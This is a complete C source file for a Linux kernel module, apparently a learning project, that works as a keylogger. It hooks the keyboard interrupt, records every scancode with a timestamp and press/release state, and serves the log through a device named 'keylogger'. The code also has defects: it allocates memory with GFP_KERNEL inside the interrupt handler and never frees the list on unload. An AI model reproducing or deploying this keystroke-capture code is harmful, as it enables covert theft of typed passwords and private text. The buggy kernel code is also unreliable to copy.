#include "./keyboard.h"

#define PATH "keylog"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("stmartin");
MODULE_DESCRIPTION("Module keylog");

t_keylst	*k_lst = NULL;
int		read_done = 0;

void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t len)
{
	char	message[128] = {0};
	int	msg_len;

	sprintf(message, "%ld:%ld:%ld %s (%d) %s\n", (node->time.tv_sec / 3600) % 24, \
			(node->time.tv_sec / 60) % 60, node->time.tv_sec % 60, \
		       	node->name, node->key, node->state ? "Released" : "Pressed");
	msg_len = strlen(message);
	if (len > msg_len)
	{
		if (!copy_to_user(buffer + **offset, message, msg_len))
			**offset += msg_len;
		else
		{
			printk(KERN_INFO "copy to user failed \n");
		}
	}
}

int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len)
{
	t_keylst	*tmp;

	if (!k_lst)
		return 1;
	tmp = k_lst;
	while (tmp)
	{
		display_list_element(tmp, buffer, offset, len);
		tmp = tmp->next;
	}
	return 2;
}

static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	if (read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len) == 2)
	{
		read_done = 1;
		return (*offset);
	}
	return 0;
}

static struct file_operations	key_ops = {

	.owner = THIS_MODULE,
	.read = key_read
};

static struct miscdevice	key_dev = {
	.minor = MISC_DYNAMIC_MINOR,
        .name = "keylogger",
        .fops = &key_ops
};

t_keylst		*find_last_list_element(t_keylst *full_lst)
{
	t_keylst	*tmp_lst;
	
	tmp_lst = full_lst;
	while (tmp_lst->next != NULL)
		tmp_lst = tmp_lst->next;
	return tmp_lst;
}

t_keylst		*init_node(t_keylst *node, unsigned char scancode)
{
	node->key = scancode & KBD_SCANCODE_MASK;
	node->state = scancode & KBD_STATUS_MASK;
	strcpy(node->name, keyboard_name[scancode & KBD_SCANCODE_MASK]);
	getnstimeofday(&(node->time));
	node->next = NULL;
	return node;
}

int			add_to_list(unsigned char scancode)
{
	t_keylst	*tmp_lst = NULL;
	t_keylst	*new_node = NULL;

	if (!(new_node = (t_keylst *)kmalloc(sizeof(t_keylst), GFP_KERNEL)))
		return 1;
	new_node = init_node(new_node, scancode);
	if (k_lst == NULL)
		k_lst = new_node;
	else
	{
		tmp_lst = k_lst;
		tmp_lst = find_last_list_element(tmp_lst);
		tmp_lst->next = new_node;
	}
	return 0;
}

static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
{
	unsigned char	scancode;

	read_done = 0;
	scancode = inb(KEYBOARD_DATA);
	if (add_to_list(scancode))
	{
		printk(KERN_INFO "kmalloc failed\n");
		return 1;
	}
	return IRQ_HANDLED;
}

static int		__init keylogger_init(void)
{
	if (misc_register(&key_dev))
		return 1;
	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
	{
		printk(KERN_INFO "something went wrong in request_irq\n");
		return -EIO;
	}
	return 0;
}

static void		__exit keylogger_exit(void)
{
	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
	misc_deregister(&key_dev);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
